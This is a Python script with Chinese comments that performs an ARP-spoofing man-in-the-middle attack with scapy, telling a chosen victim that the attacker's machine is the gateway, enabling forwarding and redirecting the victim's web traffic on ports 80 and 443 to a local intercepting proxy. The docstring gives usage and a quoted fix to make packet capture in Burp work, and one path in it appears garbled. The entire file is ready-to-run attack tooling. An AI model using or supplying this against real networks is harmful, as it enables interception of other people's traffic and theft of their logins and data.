#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 这里有个脚本可以做几件事情。

1）建立iptables来转发除80和443端口之外的所有数据流，并将80和443端口路由到本机。
2）向受害者发送Arp数据包告诉其将攻击主机作为网关。

这个代码非常的直接。使用方法如下:
python mitm.py -victim=192.168.1.14

"""
楼主的arp欺骗脚本有一点需要修改
pkt = ARP()的下面加上一句 pkt.op = 2
然后 os.system("/亲爱的in/iptables -t nat -A PREROUTING -p tcp –dport " + port + " –jump DNAT –to-destination " + args.proxy) 这句要改成 os.system("/亲爱的in/iptables -t nat -A PREROUTING -p tcp –dport " + port + " –jump DNAT –to-destination " + args.proxy + ":" + port)
不改这句的话Burp里面抓不到包
其他自定义的参数自己稍微改改就能用了
"""
'''
__author__ = '__L1n__w@tch'

from scapy.all import *
import time
import argparse
import os
import sys


def arpPoison(args):
    conf.iface = args.iface
    pkt = ARP()
    pkt.psrc = args.router
    pkt.pdst = args.victim
    try:
        while 1:
            send(pkt, verbose=args.verbose)
            time.sleep(args.freq)
    except KeyboardInterrupt:
        pass


# default just grabs the default route, http://pypi.python.org/pypi/pynetinfo/0.1.9 would be better
# but this just works and people don't have to install external libs
def getDefRoute(args):
    data = os.popen("/sbin/route -n ").readlines()
    for line in data:
        if line.startswith("0.0.0.0") and (args.iface in line):
            print("Setting route to the default: " + line.split()[1])
            args.router = line.split()[1]
            return
    print("Error: unable to find default route")
    sys.exit(0)


# default just grabs the default IP, http://pypi.python.org/pypi/pynetinfo/0.1.9 would be better
# but this just works and people don't have to install external libs
def getDefIP(args):
    data = os.popen("/sbin/ifconfig " + args.iface).readlines()
    for line in data:
        if line.strip().startswith("inet addr"):
            args.proxy = line.split(":")[1].split()[0]
            print("setting proxy to: " + args.proxy)
            return
    print("Error: unable to find default IP")
    sys.exit(0)


def fwconf(args):
    # write appropriate kernel config settings
    f = open("/proc/sys/net/ipv4/ip_forward", "w")
    f.write('1')
    f.close()
    f = open("/proc/sys/net/ipv4/conf/" + args.iface + "/send_redirects", "w")
    f.write('0')
    f.close()

    # iptables stuff
    os.system("/sbin/iptables --flush")
    os.system("/sbin/iptables -t nat --flush")
    os.system("/sbin/iptables --zero")
    os.system("/sbin/iptables -A FORWARD --in-interface " + args.iface + " -j ACCEPT")
    os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + args.iface + " -j MASQUERADE")
    # forward 80,443 to our proxy
    for port in args.ports.split(","):
        os.system(
                "/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + port + " --jump DNAT --to-destination " + args.proxy)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--victim', required=True, help="victim IP")
    parser.add_argument('--router', default=None)
    parser.add_argument('--iface', default='eth1')
    parser.add_argument('--fwconf', type=bool, default=True, help="Try to auto configure firewall")
    parser.add_argument('--freq', type=float, default=5.0, help="frequency to send packets, in seconds")
    parser.add_argument('--ports', default="80,443", help="comma seperated list of ports to forward to proxy")
    parser.add_argument('--proxy', default=None)
    parser.add_argument('--verbose', type=bool, default=True)

    args = parser.parse_args()

    # set default args
    if args.router == None:
        getDefRoute(args)
    if args.proxy == None:
        getDefIP(args)

    # do iptables rules
    if args.fwconf:
        fwconf(args)

    arpPoison(args)


if __name__ == "__main__":
    main()
